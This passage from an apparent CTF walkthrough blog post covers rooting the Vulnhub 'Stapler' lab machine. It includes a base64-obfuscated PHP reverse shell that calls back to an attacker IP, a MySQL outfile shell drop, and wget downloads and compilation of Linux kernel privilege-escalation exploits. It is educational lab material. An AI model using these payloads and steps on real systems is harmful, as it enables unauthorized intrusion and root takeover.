</pre><td class="rouge-code"><pre>&lt;?php eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguNTYuMTAxJzsgJHBvcnQgPSA0NDM7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsg.JGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOw)); ?&gt;
</pre></table></code></div></div><h3 id="used-the-select-into-outfile-mysql-statement-to-drop-my-shell-into-the-uploads-directory">Used the “select into outfile” MySQL statement to drop my shell into the uploads directory</h3><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_5.png" /></p><h3 id="setup-multihandler-to-recieve-a-shell-and-invoked-shellphp">Setup multi/handler to recieve a shell and invoked shell.php</h3><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_6.png" /></p><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_7.png" /></p><h2 id="escalation-to-root">Escalation to root</h2><h3 id="get-ourselves-a-better-pty">Get ourselves a better PTY</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>which python
/usr/bin/python
/usr/bin/python -c 'import pty;pty.spawn("/bin/bash");'
www-data@red:/var/www/https/blogblog/wp-content/uploads$
</pre></table></code></div></div><h3 id="gaining-some-information-about-the-system">Gaining some information about the system</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>www-data@red:/var/www/https/blogblog/wp-content/uploads$ uname -a
uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -l /etc/passwd
ls -l /etc/passwd
-rw-r--r-- 1 root root 2908 Jun  4  2016 /etc/passwd
www-data@red:/var/www/https/blogblog/wp-content/uploads$ ls -l /etc/shadow
ls -l /etc/shadow
-rw-r----- 1 root shadow 4518 Jun  5  2016 /etc/shadow
www-data@red:/tmp$ cat /etc/*release*
cat /etc/*release*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
</pre></table></code></div></div><h3 id="searching-for-kernel-exploit">Searching for kernel exploit</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# searchsploit 4.4.0-21
---------------------------------------------------- ----------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/platforms/)
---------------------------------------------------- ----------------------------------
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilte | lin_x86-64/local/40049.c
---------------------------------------------------- ----------------------------------
</pre></table></code></div></div><h3 id="attempting-exploit">Attempting exploit</h3><p>This exploit breaks out into two files: decr.c and pwn.c so I extracted the source from the 40049.c file and copied them over to the target machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>www-data@red:/tmp$ wget http://192.168.56.101/decr.c
wget http://192.168.56.101/decr.c
--2017-07-28 14:37:32--  http://192.168.56.101/decr.c
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3571 (3.5K) [text/x-csrc]
Saving to: 'decr.c'

decr.c              100%[===================&gt;]   3.49K  --.-KB/s    in 0s      

2017-07-28 14:37:32 (281 MB/s) - 'decr.c' saved [3571/3571]

www-data@red:/tmp$ wget http://192.168.56.101/pwn.c
wget http://192.168.56.101/pwn.c
--2017-07-28 14:37:42--  http://192.168.56.101/pwn.c
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1163 (1.1K) [text/x-csrc]
Saving to: 'pwn.c'

pwn.c               100%[===================&gt;]   1.14K  --.-KB/s    in 0s      

2017-07-28 14:37:42 (158 MB/s) - 'pwn.c' saved [1163/1163]
</pre></table></code></div></div><h3 id="compiled">Compiled</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>www-data@red:/tmp$ gcc decr.c -m32 -O2 -o decr
gcc decr.c -m32 -O2 -o decr
www-data@red:/tmp$ gcc pwn.c -O2 -o pwn
gcc pwn.c -O2 -o pwn
pwn.c: In function 'privesc':
pwn.c:25:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
         commit_creds(prepare_kernel_cred((uint64_t)NULL));
</pre></table></code></div></div><h3 id="ran-exploit">Ran exploit</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>www-data@red:/tmp$ ./decr
./decr
netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
[!] Decrementing the refcount. This may take a while...
[!] Wait for the "Done" message (even if you'll get the prompt back).

www-data@red:/tmp$ [+] Done! Now run ./pwn
./pwn
./pwn
[+] Escalating privs...
pwn: pwn.c:44: main: Assertion `!getuid()' failed.
Aborted (core dumped)
www-data@red:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></table></code></div></div><p>Failed… this did not work right.<br /> Looked at the exploit DB article again and it has a comment about “SMEP/SMAP bypass available in descr_v2.c”<br /><br /> Reading more it seems this may not work for me due to it being in a VM as this exploit is against an issue in an Intel CPU that might not be emulated right in VirtualBox… or it just plain won’t work in this situation.</p><h3 id="did-some-more-searchsploit-queries-based-on-the-machine-being-ubuntu-1604">Did some more searchsploit queries based on the machine being Ubuntu 16.04</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# searchsploit linux kernel 4.4 ubuntu 16.04
---------------------------------------------------- ----------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/platforms/)
---------------------------------------------------- ----------------------------------
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Privilege E | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'A | lin_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilte | lin_x86-64/local/40049.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput() | linux/local/39772.txt
---------------------------------------------------- ----------------------------------
</pre></table></code></div></div><p>Narrowed down on the double-fdput() exploit. Link to Exploit-DB page with download to POC zip is here <a href="https://www.exploit-db.com/exploits/39772/">https://www.exploit-db.com/exploits/39772/</a>.</p><h3 id="transfering-files-to-target">Transfering files to target</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre>www-data@red:/tmp$ wget http://192.168.56.101/compile.sh
wget http://192.168.56.101/compile.sh
--2017-07-28 15:19:04--  http://192.168.56.101/compile.sh
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 155 [text/x-sh]
Saving to: 'compile.sh'

compile.sh          100%[===================&gt;]     155  --.-KB/s    in 0s      

2017-07-28 15:19:04 (24.5 MB/s) - 'compile.sh' saved [155/155]

www-data@red:/tmp$ wget http://192.168.56.101/doubleput.c
wget http://192.168.56.101/doubleput.c
--2017-07-28 15:19:17--  http://192.168.56.101/doubleput.c
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4188 (4.1K) [text/x-csrc]
Saving to: 'doubleput.c'

doubleput.c         100%[===================&gt;]   4.09K  --.-KB/s    in 0s      

2017-07-28 15:19:17 (446 MB/s) - 'doubleput.c' saved [4188/4188]

www-data@red:/tmp$ wget http://192.168.56.101/hello.c
wget http://192.168.56.101/hello.c
--2017-07-28 15:19:26--  http://192.168.56.101/hello.c
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2186 (2.1K) [text/x-csrc]
Saving to: 'hello.c'

hello.c             100%[===================&gt;]   2.13K  --.-KB/s    in 0s      

2017-07-28 15:19:26 (336 MB/s) - 'hello.c' saved [2186/2186]

www-data@red:/tmp$ wget http://192.168.56.101/suidhelper.c
wget http://192.168.56.101/suidhelper.c
--2017-07-28 15:19:37--  http://192.168.56.101/suidhelper.c
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 255 [text/x-csrc]
Saving to: 'suidhelper.c'

suidhelper.c        100%[===================&gt;]     255  --.-KB/s    in 0s      

2017-07-28 15:19:37 (23.8 MB/s) - 'suidhelper.c' saved [255/255]
</pre></table></code></div></div><h3 id="compiling">Compiling</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>www-data@red:/tmp$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
</pre></table></code></div></div><h3 id="gaining-root-shell">Gaining root shell</h3><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_8.png" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/walkthrough/'>Walkthrough</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Stapler - Travis Mathison&url=https://tdmathison.github.io/posts/stapler/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://tdmathison.github.io/posts/stapler/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hex-Rays-IDA-Tips-and-Tricks/">Hex-Rays IDA Tips and Tricks</a><li><a href="/posts/Npm_Coa_203_DanaBot_Dropper/">NPM COA@2.0.3 DanaBot Dropper</a><li><a href="/posts/MalwareReport-CTS/">Malware Report: CTS</a><li><a href="/posts/Resolving-IAT-with-AGDCservices-scripts/">Resolving IAT with AGDCservices Scripts</a><li><a href="/posts/Finding-the-start-of-Emotet-malware-in-MFC-app/">Finding the start of Emotet malware in MFC app</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/penetration-testing/">penetration-testing</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/exploit-development/">exploit-development</a> <a class="post-tag" href="/tags/ida/">ida</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/debugging/">debugging</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/6days-lab/"><div class="card-body"> <span class="timeago small" >Jul 31, 2017<i class="unloaded">2017-07-31T12:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>6Days Lab: 1.1</h3><div class="text-muted small"><p> 6Days Lab: 1.1 Intro This is my walkthrough of the 6days lab vulnhub machine. You can find this machine at 6Days Lab. If you want to attempt to hack into this machine without spoilers, don’t read...</p></div></div></a></div><div class="card"> <a href="/posts/oscp-review/"><div class="card-body"> <span class="timeago small" >Jul 14, 2017<i class="unloaded">2017-07-14T12:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OSCP Review</h3><div class="text-muted small"><p> Background I have been a developer for longer than I can remember (over 20 years), interested in hacking and the security side of things for much of it as well. However, it wasn’t until relatively...</p></div></div></a></div><div class="card"> <a href="/posts/Penetration-Testing-Process/"><div class="card-body"> <span class="timeago small" >Jul 17, 2017<i class="unloaded">2017-07-17T12:00:00-07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Penetration Testing Process</h3><div class="text-muted small"><p> The following is a general guideline for how I would start to attack a machine. I broke it down into enumeration, doing research on what I found, exploitation (either getting root or a low privile...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Penetration-Testing-Process/" class="btn btn-outline-primary" prompt="Older"><p>Penetration Testing Process</p></a> <a href="/posts/6days-lab/" class="btn btn-outline-primary" prompt="Newer"><p>6Days Lab: 1.1</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://tdmathison.github.io/posts/stapler/'; this.page.identifier = '/posts/stapler/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://tdmathison.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (modeToggle !== null) { modeToggle.addEventListener('click', reloadDisqus); window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/ciph34block">Travis Mathison</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/penetration-testing/">penetration testing</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/exploit-development/">exploit development</a> <a class="post-tag" href="/tags/ida/">ida</a> <a class="post-tag" href="/tags/shellcode/">shellcode</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/debugging/">debugging</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-MXD056XG1T"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-MXD056XG1T'); }); </script>
